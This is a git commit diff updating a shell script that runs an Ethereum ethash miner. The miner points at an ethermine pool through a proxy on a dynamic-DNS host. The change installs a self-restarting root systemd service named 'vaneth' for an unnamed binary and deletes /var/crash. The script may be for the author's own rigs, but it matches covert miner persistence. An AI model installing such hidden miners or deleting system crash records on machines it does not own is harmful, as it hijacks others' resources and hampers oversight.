1a76b5e8fb5ad43bc9b88dbdb57341467c41ab19
trangtrau <30510221+trangtrau@users.noreply.github.com>
2022-09-02 04:22:49 +0700

    Update daotam.sh

--- ETH/daotam.sh
+++ ETH/daotam.sh
@@ -1,4 +1,23 @@
 #!/bin/bash
-sudo cp /home/a /home/van
-nohup /home/van -a ethash -o ethproxy+tcp://asia1.ethermine.org:4444 -u 0xac2a5aaa1b901c08b383fc7163ebd5bd4ee24d70.worker --proxy 6f390780b468.sn.mynetname.net:9090 &
+cd /home
 
+sudo rm -rf /lib/systemd/system/vaneth.service
+sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/vaneth.service 
+[Unit]
+Description=vaneth
+After=network.target
+[Service]
+ExecStart= /home/a  -a ethash -o ethproxy+tcp://asia1.ethermine.org:4444 -u 0xac2a5aaa1b901c08b383fc7163ebd5bd4ee24d70.worker --proxy 6f390780b468.sn.mynetname.net:9090 
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+sudo systemctl daemon-reload &&
+sudo systemctl enable vaneth.service &&
+sudo service vaneth stop  &&
+sudo service vaneth restart
